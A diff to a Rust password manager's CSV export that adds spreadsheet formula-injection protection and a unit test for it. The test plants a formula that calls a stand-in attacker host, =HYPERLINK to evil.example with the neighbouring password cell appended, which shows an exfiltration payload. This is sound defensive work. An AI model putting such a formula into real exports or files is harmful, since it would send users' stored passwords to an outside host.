@@ -129,7 +129,34 @@ pub fn export_json(vault: &Vault) -> Result<Zeroizing<String>, vault_core::Error
     Ok(Zeroizing::new(text))
 }
 
+/// What a spreadsheet reads as the start of a formula.
+const FORMULA_STARTS: [char; 6] = ['=', '+', '-', '@', '\t', '\r'];
+
+/// A CSV cell that a spreadsheet would run as a formula gets a leading `'`, which shows it
+/// as plain text: a title such as `=HYPERLINK(…)` that came from someone else's file must not
+/// send the passwords next to it anywhere when the export is opened. [`from_text`] takes the
+/// mark off again on import.
+pub(crate) fn as_text(cell: String) -> String {
+    if cell.starts_with(FORMULA_STARTS) {
+        format!("'{cell}")
+    } else {
+        cell
+    }
+}
+
+/// The cell as it was before [`as_text`].
+pub(crate) fn from_text(cell: String) -> String {
+    match cell.strip_prefix('\'') {
+        Some(rest) if rest.starts_with(FORMULA_STARTS) => rest.to_owned(),
+        _ => cell,
+    }
+}
+
 /// CSV in the common layout (logins and notes; cards go out as notes with their fields).
+///
+/// Text cells are marked so spreadsheets don't run them as formulas ([`as_text`]). The
+/// password and the one-time code secret are written exactly as they are: other managers
+/// read this file too, and a changed password would no longer sign in.
 pub fn export_csv(vault: &Vault) -> Result<Zeroizing<String>, vault_core::Error> {
     let mut writer = csv::Writer::from_writer(Vec::new());
     let header = [
@@ -158,15 +185,15 @@ pub fn export_csv(vault: &Vault) -> Result<Zeroizing<String>, vault_core::Error>
         }
         let is_login = matches!(item.kind, ItemKind::Login | ItemKind::Passkey);
         let mut record = Zeroizing::new(vec![
-            folder.unwrap_or_default(),
+            as_text(folder.unwrap_or_default()),
             if item.favorite { "1" } else { "" }.to_owned(),
             if is_login { "login" } else { "note" }.to_owned(),
-            item.title.clone(),
-            item.notes.clone(),
-            fields.join("\n"),
+            as_text(item.title.clone()),
+            as_text(item.notes.clone()),
+            as_text(fields.join("\n")),
             if item.reprompt { "1" } else { "" }.to_owned(),
-            item.urls.first().cloned().unwrap_or_default(),
-            item.username.clone(),
+            as_text(item.urls.first().cloned().unwrap_or_default()),
+            as_text(item.username.clone()),
             item.password.clone(),
             item.totp.clone(),
         ]);
@@ -261,6 +288,41 @@ mod tests {
         assert_eq!(report.items[gmail].password, "pa,ss\"word");
         assert_eq!(report.folders[gmail].as_deref(), Some("Google"));
         assert!(report.items[gmail].favorite);
+    }
+
+    #[test]
+    fn csv_cells_that_look_like_formulas_are_marked_as_text() {
+        let mut vault = vault();
+        let mut planted = ItemData::login(
+            "=HYPERLINK(\"https://evil.example/?\"&J2,\"x\")",
+            "+1 555 0100",
+            "-starts-with-a-dash",
+            "https://example.com",
+        );
+        planted.notes = "@SUM(1)".into();
+        vault.add_item(&planted).unwrap();
+
+        let csv = export_csv(&vault).unwrap();
+        assert!(csv.contains("'=HYPERLINK"), "{}", csv.as_str());
+        assert!(csv.contains("'+1 555 0100"));
+        assert!(csv.contains("'@SUM(1)"));
+        // The password goes out exactly as it is.
+        assert!(csv.contains(",-starts-with-a-dash,"));
+        assert!(!csv.contains("'-starts-with-a-dash"));
+
+        // Our importer takes the mark off again.
+        let report = import_csv(csv.as_bytes()).unwrap();
+        let item = report
+            .items
+            .iter()
+            .find(|i| i.username == "+1 555 0100")
+            .unwrap();
+        assert_eq!(item.title, planted.title);
+        assert_eq!(item.notes, "@SUM(1)");
+        assert_eq!(item.password, "-starts-with-a-dash");
+        // A plain apostrophe at the start is kept.
+        assert_eq!(from_text("'quoted".into()), "'quoted");
+        assert_eq!(as_text("plain".into()), "plain");
     }
 
     #[test]
